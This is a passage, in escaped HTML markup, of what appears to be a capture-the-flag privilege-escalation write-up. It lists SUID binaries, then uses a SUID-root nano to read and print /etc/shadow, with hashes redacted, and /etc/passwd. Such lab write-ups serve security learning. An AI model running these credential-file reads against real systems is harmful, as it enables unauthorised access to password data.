&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3000&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Oct &lt;span class="m">26&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3372&lt;/span> &lt;span class="m">419&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">428240&lt;/span> Oct &lt;span class="m">7&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6446&lt;/span> &lt;span class="m">125&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">127656&lt;/span> May &lt;span class="m">12&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core/15419/usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7634&lt;/span> &lt;span class="m">386&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root dip &lt;span class="m">394984&lt;/span> Jul &lt;span class="m">23&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/15419/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">56&lt;/span> &lt;span class="m">43&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">43088&lt;/span> Sep &lt;span class="m">16&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core18/2785/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">65&lt;/span> &lt;span class="m">63&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">64424&lt;/span> Jun &lt;span class="m">28&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core18/2785/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44664&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">99&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">26696&lt;/span> Sep &lt;span class="m">16&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core18/2785/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1754&lt;/span> &lt;span class="m">75&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">76496&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1756&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44528&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1809&lt;/span> &lt;span class="m">75&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75824&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1873&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40344&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1886&lt;/span> &lt;span class="m">59&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">59640&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1977&lt;/span> &lt;span class="m">146&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">149080&lt;/span> Apr &lt;span class="m">4&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core18/2785/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2065&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Oct &lt;span class="m">25&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2375&lt;/span> &lt;span class="m">427&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">436552&lt;/span> Mar &lt;span class="m">30&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2785/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">56&lt;/span> &lt;span class="m">43&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">43088&lt;/span> Sep &lt;span class="m">16&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core18/2751/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">65&lt;/span> &lt;span class="m">63&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">64424&lt;/span> Jun &lt;span class="m">28&lt;/span> &lt;span class="m">2019&lt;/span> /snap/core18/2751/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44664&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">99&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">26696&lt;/span> Sep &lt;span class="m">16&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core18/2751/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1728&lt;/span> &lt;span class="m">75&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">76496&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1730&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44528&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1783&lt;/span> &lt;span class="m">75&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75824&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1847&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40344&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1860&lt;/span> &lt;span class="m">59&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">59640&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1951&lt;/span> &lt;span class="m">146&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">149080&lt;/span> Apr &lt;span class="m">4&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core18/2751/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2039&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Oct &lt;span class="m">25&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2349&lt;/span> &lt;span class="m">427&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">436552&lt;/span> Mar &lt;span class="m">30&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core18/2751/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10732&lt;/span> &lt;span class="m">52&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root messagebus &lt;span class="m">51344&lt;/span> Oct &lt;span class="m">25&lt;/span> &lt;span class="m">2022&lt;/span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">25779&lt;/span> &lt;span class="m">464&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">473576&lt;/span> Apr &lt;span class="m">3&lt;/span> &lt;span class="m">2023&lt;/span> /usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">13935&lt;/span> &lt;span class="m">24&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">22840&lt;/span> Feb &lt;span class="m">21&lt;/span> &lt;span class="m">2022&lt;/span> /usr/lib/policykit-1/polkit-agent-helper-1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7479&lt;/span> &lt;span class="m">16&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">14488&lt;/span> Jul &lt;span class="m">8&lt;/span> &lt;span class="m">2019&lt;/span> /usr/lib/eject/dmcrypt-get-device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7044&lt;/span> &lt;span class="m">144&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">146888&lt;/span> May &lt;span class="m">29&lt;/span> &lt;span class="m">2023&lt;/span> /usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9161&lt;/span> &lt;span class="m">84&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">85064&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">13933&lt;/span> &lt;span class="m">32&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">31032&lt;/span> Feb &lt;span class="m">21&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/pkexec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">16077&lt;/span> &lt;span class="m">164&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">166056&lt;/span> Apr &lt;span class="m">4&lt;/span> &lt;span class="m">2023&lt;/span> /usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5576&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39144&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /usr/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9166&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">68208&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9165&lt;/span> &lt;span class="m">88&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">88464&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3189&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44784&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9163&lt;/span> &lt;span class="m">52&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">53040&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2136&lt;/span> &lt;span class="m">316&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">320136&lt;/span> Apr &lt;span class="m">10&lt;/span> &lt;span class="m">2020&lt;/span> /usr/bin/nano
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10845&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">67816&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /usr/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2028&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39144&lt;/span> Mar &lt;span class="m">7&lt;/span> &lt;span class="m">2020&lt;/span> /usr/bin/fusermount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1571&lt;/span> &lt;span class="m">316&lt;/span> -rwsr-x--- &lt;span class="m">1&lt;/span> root zeamkish &lt;span class="m">320160&lt;/span> Feb &lt;span class="m">18&lt;/span> &lt;span class="m">2020&lt;/span> /usr/bin/find
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2166&lt;/span> &lt;span class="m">56&lt;/span> -rwsr-sr-x &lt;span class="m">1&lt;/span> daemon daemon &lt;span class="m">55560&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2018&lt;/span> /usr/bin/at
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5210&lt;/span> &lt;span class="m">56&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">55528&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /usr/bin/mount
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that we can run nano with root privileges.&lt;/p>
&lt;p>I tried to gain a root shell but failed, so I just went and read the file of the shadow and password:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/usr/bin/nano /etc/shadow
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:&amp;lt;redacted&amp;gt;:19519:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">games:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lp:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mail:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">news:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uucp:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxy:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">backup:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">list:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">irc:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gnats:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-network:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-resolve:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-timesync:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">messagebus:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_apt:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tss:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uuidd:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sshd:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">landscape:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pollinate:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ec2-instance-connect:!:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-coredump:!!:19502::::::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ubuntu:&amp;lt;redacted&amp;gt;:19519:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lxd:!:19502::::::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:!:19502:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish:&amp;lt;redacted&amp;gt;:19516:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp:*:19519:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bind:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Debian-snmp:!:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mosquitto:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fwupd-refresh:*:19544:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/nano /etc/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gnats:x:41:41:Gnats Bug-Reporting System &lt;span class="o">(&lt;/span>admin&lt;span class="o">)&lt;/span>:/var/lib/gnats:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pollinate:x:111:1::/var/cache/pollinate:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
